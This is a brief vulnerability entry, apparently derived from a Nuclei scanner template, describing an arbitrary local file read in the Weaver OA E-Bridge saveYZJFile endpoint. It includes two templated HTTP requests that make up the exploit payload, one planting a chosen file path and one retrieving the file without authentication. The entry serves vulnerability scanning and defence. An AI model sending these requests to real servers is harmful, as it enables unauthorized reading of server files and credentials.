# Vulnerability: Weaver E-Bidge saveYZJFile - Local File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`weaver-ebridge-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the Weaver OA E-Bridge saveYZJFile interface. An attacker can read any file on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl={{path}} HTTP/1.1
Host: {{Hostname}}

GET /file/fileNoLogin/{{idname}} HTTP/1.1
Host: {{Hostname}}
```

